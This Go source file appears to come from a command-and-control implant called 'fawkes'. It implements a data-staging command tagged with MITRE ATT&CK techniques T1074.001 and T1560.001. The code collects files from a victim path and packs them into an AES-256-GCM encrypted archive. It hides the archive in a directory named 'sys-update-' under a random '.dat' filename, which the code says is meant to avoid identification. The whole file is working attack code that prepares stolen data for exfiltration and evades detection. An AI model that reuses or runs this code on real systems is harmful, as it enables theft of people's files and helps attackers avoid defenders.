package commands

import (
	"archive/zip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// compressStage collects files from a path into an AES-256-GCM encrypted archive
// in a staging directory. Returns the encryption key and staging metadata.
// MITRE ATT&CK: T1074.001 (Local Data Staging), T1560.001 (Archive via Utility)
func compressStage(task structs.Task, params CompressParams) structs.CommandResult {
	if params.Path == "" {
		return errorResult("Error: 'path' is required for stage action")
	}

	srcPath, err := filepath.Abs(params.Path)
	if err != nil {
		return errorf("Error resolving path: %v", err)
	}

	if _, err := os.Stat(srcPath); err != nil {
		return errorf("Error accessing source: %v", err)
	}

	// Create staging directory
	stagingDir := params.Output
	if stagingDir == "" {
		stagingDir, err = os.MkdirTemp("", "sys-update-")
		if err != nil {
			return errorf("Error creating staging directory: %v", err)
		}
	} else {
		stagingDir, err = filepath.Abs(stagingDir)
		if err != nil {
			return errorf("Error resolving staging path: %v", err)
		}
		if mkErr := os.MkdirAll(stagingDir, 0700); mkErr != nil {
			return errorf("Error creating staging directory: %v", mkErr)
		}
	}

	// Generate random archive name to avoid identification
	randBytes := make([]byte, 8)
	if _, err := rand.Read(randBytes); err != nil {
		return errorf("Error generating random name: %v", err)
	}
	archiveName := hex.EncodeToString(randBytes) + ".dat"
	archivePath := filepath.Join(stagingDir, archiveName)

	// Step 1: Create temporary zip in memory-mapped temp file
	tmpZip, err := os.CreateTemp(stagingDir, ".tmp-")
	if err != nil {
		return errorf("Error creating temp file: %v", err)
	}
	tmpZipPath := tmpZip.Name()
	defer os.Remove(tmpZipPath)

	zipWriter := zip.NewWriter(tmpZip)
	var fileCount int
	var totalSize int64

	err = filepath.WalkDir(srcPath, func(path string, d fs.DirEntry, walkErr error) error {
		if task.DidStop() {
			return fmt.Errorf("cancelled")
		}
		if walkErr != nil {
			return nil // skip inaccessible files
		}
		if d.IsDir() {
			return nil
		}

		// Check depth
		relPath, _ := filepath.Rel(srcPath, path)
		depth := len(strings.Split(relPath, string(os.PathSeparator)))
		if depth > params.MaxDepth {
			return nil
		}

		// Apply pattern filter
		if params.Pattern != "" {
			matched, matchErr := filepath.Match(params.Pattern, filepath.Base(path))
			if matchErr != nil || !matched {
				return nil
			}
		}

		info, err := d.Info()
		if err != nil {
			return nil
		}

		// Check file size
		if info.Size() > params.MaxSize {
			return nil
		}

		// Add to zip
		relName := filepath.ToSlash(relPath)
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return nil
		}
		header.Name = relName
		header.Method = zip.Deflate

		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return nil
		}

		file, err := os.Open(path)
		if err != nil {
			return nil
		}
		defer file.Close()

		written, err := io.Copy(writer, file)
		if err != nil {
			return nil
		}

		fileCount++
		totalSize += written
		return nil
	})

	if err != nil {
		tmpZip.Close()
		return errorf("Error collecting files: %v", err)
	}

	if err := zipWriter.Close(); err != nil {
		tmpZip.Close()
		return errorf("Error finalizing archive: %v", err)
	}
	tmpZip.Close()

	if fileCount == 0 {
		return errorResult("No files matched the staging criteria")
	}

	// Step 2: Encrypt the zip archive with AES-256-GCM
	key := make([]byte, 32) // AES-256
	if _, err := rand.Read(key); err != nil {
		return errorf("Error generating encryption key: %v", err)
	}

	plaintext, err := os.ReadFile(tmpZipPath)
	if err != nil {
		return errorf("Error reading archive for encryption: %v", err)
	}

	// Compute SHA-256 hash of plaintext for integrity verification
	plaintextHash := sha256.Sum256(plaintext)

	ciphertext, err := encryptAESGCM(key, plaintext)
	if err != nil {
		return errorf("Error encrypting archive: %v", err)
	}

	// Write encrypted archive
	if err := os.WriteFile(archivePath, ciphertext, 0600); err != nil {
		return errorf("Error writing encrypted archive: %v", err)
	}

	// Build staging metadata
	metadata := stageMetadata{
		StagingDir:    stagingDir,
		ArchivePath:   archivePath,
		EncryptionKey: hex.EncodeToString(key),
		OriginalSize:  totalSize,
		ArchiveSize:   int64(len(ciphertext)),
		FileCount:     fileCount,
		SHA256:        hex.EncodeToString(plaintextHash[:]),
		SourcePath:    srcPath,
	}

	metadataJSON, _ := json.Marshal(metadata)

	return structs.CommandResult{
		Output:    string(metadataJSON),
		Status:    "success",
		Completed: true,
	}
}

// stageMetadata holds the result of a staging operation.
type stageMetadata struct {
	StagingDir    string `json:"staging_dir"`
	ArchivePath   string `json:"archive_path"`
	EncryptionKey string `json:"encryption_key"`
	OriginalSize  int64  `json:"original_size"`
	ArchiveSize   int64  `json:"archive_size"`
	FileCount     int    `json:"file_count"`
	SHA256        string `json:"sha256"`
	SourcePath    string `json:"source_path"`
}

// encryptAESGCM encrypts data using AES-256-GCM.
// Returns nonce + ciphertext (nonce is prepended).
func encryptAESGCM(key, plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("aes.NewCipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("cipher.NewGCM: %w", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, fmt.Errorf("generating nonce: %w", err)
	}

	// Seal appends ciphertext+tag to nonce
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

// decryptAESGCM decrypts data encrypted by encryptAESGCM.
// Expects nonce prepended to ciphertext.
func decryptAESGCM(key, data []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("aes.NewCipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("cipher.NewGCM: %w", err)
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}
